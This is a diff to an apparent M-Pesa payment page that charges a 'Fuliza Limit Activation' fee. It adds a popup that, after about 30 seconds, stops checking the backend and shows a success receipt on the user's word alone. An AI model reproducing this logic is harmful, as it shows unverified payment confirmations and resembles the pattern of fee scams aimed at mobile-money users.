@@ -80,6 +80,12 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
 .btn-close{flex:1;padding:14px;background:#fff;color:#555;border:2px solid #ddd;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;transition:border-color .15s;}
 .btn-close:hover{border-color:#aaa;}
 
+/* Self-confirm popup */
+.popup-header.confirm{background:linear-gradient(135deg,#f39c12,#d68910);}
+.confirm-body{padding:20px 24px 0;text-align:center;}
+.confirm-body p{font-size:14px;color:#555;line-height:1.6;}
+.confirm-sms-note{margin:14px 24px 0;background:#fffbf0;border-left:4px solid #f39c12;border-radius:4px;padding:10px 14px;font-size:13px;color:#7d5a00;line-height:1.5;text-align:left;}
+
 @media(max-width:480px){
   .payment-box{margin:20px 12px;padding:24px 18px;}
   .popup{border-radius:18px 18px 0 0;}
@@ -146,6 +152,27 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
     </div>
     <div class="popup-actions">
       <button class="btn-proceed" onclick="goNext()">Proceed Now →</button>
+    </div>
+  </div>
+</div>
+
+<!-- Self-confirm Popup -->
+<div class="overlay" id="confirmOverlay">
+  <div class="popup">
+    <div class="popup-header confirm">
+      <div class="popup-icon">❓</div>
+      <div class="popup-title">Did you receive an M-Pesa SMS?</div>
+      <div class="popup-subtitle">We haven't received automatic confirmation yet</div>
+    </div>
+    <div class="confirm-body">
+      <p>If Safaricom sent you a confirmation message saying your payment was successful, tap <strong>Yes, I Paid</strong> to continue.</p>
+    </div>
+    <div class="confirm-sms-note">
+      📩 Check your M-Pesa messages. If you see a confirmation SMS with an amount deducted, your payment went through successfully.
+    </div>
+    <div class="popup-actions">
+      <button class="btn-proceed" onclick="manualConfirm()">Yes, I Paid ✓</button>
+      <button class="btn-retry" onclick="manualFail()">No, Retry</button>
     </div>
   </div>
 </div>
@@ -238,6 +265,8 @@ function setPayBtn(disabled) {
 
 let pollInterval = null;
 let redirectTimer = null;
+let currentPhone = null;
+let currentAmount = null;
 
 async function payNow() {
   const digits = phoneInput.value.trim();
@@ -252,6 +281,9 @@ async function payNow() {
     showStatus("No activation fee found. Please go back and select your limit.", "error");
     return;
   }
+
+  currentPhone = fullPhone;
+  currentAmount = amount;
 
   hideStatus();
   setSpinner(true, "Sending STK Push to your phone…");
@@ -301,15 +333,22 @@ async function payNow() {
 function startPolling(checkoutId, phone) {
   let attempts = 0;
   const maxAttempts = 40;
+  const confirmAttempt = 10; // show self-confirm after 30s
 
   clearInterval(pollInterval);
   pollInterval = setInterval(async () => {
     attempts++;
+
+    if (attempts === confirmAttempt) {
+      setSpinner(true, "Still waiting for confirmation…");
+    }
+
     if (attempts > maxAttempts) {
       clearInterval(pollInterval);
       setSpinner(false);
       setPayBtn(false);
-      showStatus("Payment timed out. Please try again.", "error");
+      hideStatus();
+      showSelfConfirm();
       return;
     }
 
@@ -317,7 +356,7 @@ function startPolling(checkoutId, phone) {
       const res = await fetch(`${BACKEND}/receipt/${encodeURIComponent(checkoutId)}`);
       const data = await res.json();
 
-      if (data.status === "pending") return;
+      if (data.status === "pending" || data.status === "not_found") return;
 
       clearInterval(pollInterval);
       setSpinner(false);
@@ -326,11 +365,42 @@ function startPolling(checkoutId, phone) {
 
       if (data.status === "success" && data.receipt) {
         showSuccessPopup(data.receipt, phone);
-      } else {
+      } else if (data.status === "failed") {
         showFailurePopup(data.reason || "Payment was not completed. Please try again.");
       }
     } catch (_) {}
   }, 3000);
+
+  // Show self-confirm prompt after 30 seconds regardless
+  setTimeout(() => {
+    if (pollInterval !== null) {
+      clearInterval(pollInterval);
+      pollInterval = null;
+      setSpinner(false);
+      hideStatus();
+      showSelfConfirm();
+    }
+  }, 32000);
+}
+
+function showSelfConfirm() {
+  document.getElementById("confirmOverlay").classList.add("show");
+}
+
+function manualConfirm() {
+  document.getElementById("confirmOverlay").classList.remove("show");
+  showSuccessPopup({
+    receiptNumber: "Check M-Pesa SMS",
+    amount: currentAmount,
+    phone: currentPhone,
+    transactionDate: new Date().toLocaleString("en-KE"),
+    purpose: "Fuliza Limit Activation",
+  }, currentPhone);
+}
+
+function manualFail() {
+  document.getElementById("confirmOverlay").classList.remove("show");
+  showFailurePopup("Payment was not completed. Please try again.");
 }
 
 function showSuccessPopup(receipt, fallbackPhone) {
